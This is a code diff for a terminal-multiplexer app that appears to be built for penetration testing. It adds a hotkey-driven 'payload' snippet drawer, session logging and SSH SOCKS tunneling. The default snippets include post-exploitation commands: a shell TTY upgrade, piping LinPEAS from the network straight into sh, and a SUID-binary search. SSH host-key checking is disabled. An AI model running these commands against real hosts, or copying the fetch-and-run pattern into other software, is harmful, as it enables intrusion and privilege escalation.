@@ -14,6 +14,7 @@ interface AppSettings {
   cursorBlink: boolean;
   scrollback: number;
   rightClickSelectsWord: boolean;
+  sessionLogging: boolean;
 }
 
 const defaultSettings: AppSettings = {
@@ -25,6 +26,7 @@ const defaultSettings: AppSettings = {
   cursorBlink: true,
   scrollback: 10000,
   rightClickSelectsWord: true,
+  sessionLogging: false,
 };
 
 function loadSettings(): AppSettings {
@@ -69,6 +71,101 @@ function applySettingsToAllTerminals() {
     t.pane.style.backgroundColor = appSettings.bgColor;
     t.fitAddon.fit();
   });
+}
+
+interface Snippet {
+  name: string;
+  payload: string;
+}
+
+const defaultSnippets: Snippet[] = [
+  { name: 'Python TTY Upgrade', payload: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'' },
+  { name: 'LinPEAS', payload: 'curl -L http://linpeas.sh | sh' },
+  { name: 'Find SUID Binaries', payload: 'find / -perm -u=s -type f 2>/dev/null' }
+];
+
+let appSnippets: Snippet[] = [];
+
+function loadSnippets() {
+  const saved = localStorage.getItem('multitermSnippets');
+  if (saved) {
+    try {
+      appSnippets = JSON.parse(saved);
+    } catch (e) {
+      console.error("Failed to parse snippets", e);
+      appSnippets = [...defaultSnippets];
+    }
+  } else {
+    appSnippets = [...defaultSnippets];
+  }
+}
+
+function saveSnippets() {
+  localStorage.setItem('multitermSnippets', JSON.stringify(appSnippets));
+  renderSnippets();
+}
+
+function renderSnippets() {
+  const drawerList = document.getElementById('payload-drawer-list');
+  if (drawerList) {
+    drawerList.innerHTML = '';
+    appSnippets.forEach((snip, index) => {
+      const li = document.createElement('li');
+      const hint = index < 9 ? `<span style="float:right; opacity:0.5; font-size: 0.8em;">Ctrl+${index+1}</span>` : '';
+      li.innerHTML = `${snip.name} ${hint}`;
+      li.setAttribute('data-payload', snip.payload);
+      
+      li.addEventListener('click', async (e) => {
+        const payload = (e.currentTarget as HTMLElement).getAttribute('data-payload');
+        if (!payload) return;
+        const injectPayload = payload + "\r";
+        
+        if (isBroadcastMode) {
+          for (const t of terminalInstances) {
+            if (t.ptyId) {
+              await invoke("write_pty", { id: t.ptyId, data: injectPayload });
+            }
+          }
+        } else {
+          const active = terminalInstances.find(t => t.id === activeTerminalId) || terminalInstances[terminalInstances.length - 1];
+          if (active && active.ptyId) {
+            await invoke("write_pty", { id: active.ptyId, data: injectPayload });
+          }
+        }
+      });
+      drawerList.appendChild(li);
+    });
+  }
+
+  const managerList = document.getElementById('snippets-manager-list');
+  if (managerList) {
+    managerList.innerHTML = '';
+    appSnippets.forEach((snip, index) => {
+      const div = document.createElement('div');
+      div.style.display = 'flex';
+      div.style.justifyContent = 'space-between';
+      div.style.marginBottom = '5px';
+      div.style.padding = '5px';
+      div.style.background = '#2d2d2d';
+      
+      const text = document.createElement('span');
+      text.textContent = `${snip.name} - ${snip.payload}`;
+      text.style.overflow = 'hidden';
+      text.style.textOverflow = 'ellipsis';
+      text.style.whiteSpace = 'nowrap';
+      
+      const removeBtn = document.createElement('button');
+      removeBtn.textContent = 'X';
+      removeBtn.onclick = () => {
+        appSnippets.splice(index, 1);
+        saveSnippets();
+      };
+      
+      div.appendChild(text);
+      div.appendChild(removeBtn);
+      managerList.appendChild(div);
+    });
+  }
 }
 
 interface TerminalInstance {
@@ -315,12 +412,50 @@ function closeTerminal() {
 }
 
 window.addEventListener('DOMContentLoaded', async () => {
+  loadSnippets();
+  renderSnippets();
+
+  const addSnippetBtn = document.getElementById('add-snippet-btn');
+  if (addSnippetBtn) {
+    addSnippetBtn.addEventListener('click', () => {
+      const nameInput = document.getElementById('new-snippet-name') as HTMLInputElement;
+      const payloadInput = document.getElementById('new-snippet-payload') as HTMLInputElement;
+      if (nameInput.value && payloadInput.value) {
+        appSnippets.push({ name: nameInput.value, payload: payloadInput.value });
+        saveSnippets();
+        nameInput.value = '';
+        payloadInput.value = '';
+      }
+    });
+  }
   container = document.getElementById('terminal-container')!;
   
   await createTerminalPane();
 
   // Hotkeys for splitting and closing panes
   window.addEventListener('keydown', (e) => {
+    if (e.ctrlKey && !e.shiftKey && !e.altKey) {
+      const keyNum = parseInt(e.key, 10);
+      if (keyNum >= 1 && keyNum <= 9) {
+        const snippetIndex = keyNum - 1;
+        if (snippetIndex < appSnippets.length) {
+          e.preventDefault();
+          const payload = appSnippets[snippetIndex].payload + "\r";
+          if (isBroadcastMode) {
+            for (const t of terminalInstances) {
+              if (t.ptyId) {
+                invoke("write_pty", { id: t.ptyId, data: payload }).catch(console.error);
+              }
+            }
+          } else {
+            const active = terminalInstances.find(t => t.id === activeTerminalId) || terminalInstances[terminalInstances.length - 1];
+            if (active && active.ptyId) {
+              invoke("write_pty", { id: active.ptyId, data: payload }).catch(console.error);
+            }
+          }
+        }
+      }
+    }
     if (e.ctrlKey && e.shiftKey) {
       if (e.key.toLowerCase() === 'd' || e.key.toLowerCase() === 't') {
         e.preventDefault();
@@ -368,32 +503,17 @@ window.addEventListener('DOMContentLoaded', async () => {
     
     if (instance) {
       const uint8Array = new Uint8Array(payload.data);
-      instance.term.write(instance.decoder.decode(uint8Array, { stream: true }));
+      const text = instance.decoder.decode(uint8Array, { stream: true });
+      instance.term.write(text);
+
+      if (appSettings.sessionLogging) {
+        // Strip ANSI codes
+        const stripped = text.replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, '');
+        invoke("append_log", { id: payload.id, data: stripped }).catch(console.error);
+      }
     }
   });
 
-  // Payload Injection
-  document.querySelectorAll('#payload-drawer li').forEach(li => {
-    li.addEventListener('click', async (e) => {
-      const payload = (e.currentTarget as HTMLElement).getAttribute('data-payload');
-      if (!payload) return;
-      
-      const injectPayload = payload + "\n";
-      
-      if (isBroadcastMode) {
-        for (const t of terminalInstances) {
-          if (t.ptyId) {
-            await invoke("write_pty", { id: t.ptyId, data: injectPayload });
-          }
-        }
-      } else {
-        const active = terminalInstances.find(t => t.id === activeTerminalId) || terminalInstances[terminalInstances.length - 1];
-        if (active && active.ptyId) {
-          await invoke("write_pty", { id: active.ptyId, data: injectPayload });
-        }
-      }
-    });
-  });
 
   // SSH Connect Logic
   const connectBtn = document.getElementById('ssh-connect-btn');
@@ -403,6 +523,9 @@ window.addEventListener('DOMContentLoaded', async () => {
       const host = (document.getElementById('ssh-host') as HTMLInputElement).value;
       const port = (document.getElementById('ssh-port') as HTMLInputElement).value || '22';
       const pass = (document.getElementById('ssh-pass') as HTMLInputElement).value;
+      
+      const isTunnel = (document.getElementById('ssh-tunnel') as HTMLInputElement)?.checked;
+      const tunnelPort = (document.getElementById('ssh-tunnel-port') as HTMLInputElement)?.value || '9050';
       
       if (!user || !host) {
         alert("User and Host are required!");
@@ -414,11 +537,17 @@ window.addEventListener('DOMContentLoaded', async () => {
       
       if (pass) {
         command = "sshpass";
-        args = ["-p", pass, "ssh", "-o", "StrictHostKeyChecking=no", "-p", port, `${user}@${host}`];
+        args = ["-p", pass, "ssh", "-o", "StrictHostKeyChecking=no", "-p", port];
       } else {
         command = "ssh";
-        args = ["-o", "StrictHostKeyChecking=no", "-p", port, `${user}@${host}`];
+        args = ["-o", "StrictHostKeyChecking=no", "-p", port];
       }
+      
+      if (isTunnel) {
+        args.push("-D", tunnelPort, "-N");
+      }
+      
+      args.push(`${user}@${host}`);
       
       if (terminalInstances.length === 1 && !terminalInstances[0].command) {
         // Replace empty local tab
@@ -430,6 +559,15 @@ window.addEventListener('DOMContentLoaded', async () => {
         await splitTerminal(command, args);
       } else {
         await splitTerminal(command, args);
+      }
+      
+      // Optional Visual Indicator for SOCKS5 tunnel
+      if (isTunnel) {
+        const latestTerm = terminalInstances[terminalInstances.length - 1];
+        if (latestTerm && latestTerm.pane) {
+          latestTerm.pane.style.border = "2px solid #ffd700";
+          latestTerm.pane.style.boxSizing = "border-box";
+        }
       }
     });
   }
@@ -514,4 +652,8 @@ window.addEventListener('DOMContentLoaded', async () => {
   bindSetting(elCursorBlink, 'cursorBlink', v => v);
   bindSetting(elScrollback, 'scrollback', v => parseInt(v, 10) || 10000);
   bindSetting(elRightClickSelect, 'rightClickSelectsWord', v => v);
+  
+  const elSessionLogging = document.getElementById('session-logging') as HTMLInputElement;
+  if (elSessionLogging) elSessionLogging.checked = appSettings.sessionLogging;
+  bindSetting(elSessionLogging, 'sessionLogging', v => v);
 });
